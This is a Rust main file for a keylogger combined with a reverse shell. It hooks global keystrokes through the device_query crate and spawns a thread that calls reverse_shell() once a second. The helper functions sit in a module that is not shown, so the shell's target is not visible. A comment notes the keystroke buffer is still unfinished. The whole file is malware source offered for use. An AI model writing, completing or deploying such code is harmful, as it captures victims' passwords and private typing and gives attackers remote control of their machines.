extern crate dotenv;

mod lib;

use std::{ thread, time::Duration };

use device_query::{ DeviceState, DeviceEvents };
use lib::{ match_case, reverse_shell };


fn main() {

    // create a device state
    let device_state = DeviceState::new();

   
    thread::spawn( move|| {
        loop {
            reverse_shell();
            thread::sleep(Duration::from_millis(1000));
        }
    });

    // create a device events
    let _guard = device_state.on_key_down( move|key| {
        
        let mut buffer = String::from("");

        // check which key is pressed
        let s = match_case(key, &mut buffer); 
        println!("{}", s);
        // Buffer is still initalized everytime the key is pressed
        // maybe it's better to declare it outsite and use channels to communicate
        // with the main thread
        println!("{}", buffer.len());

    });
        
    loop {}
}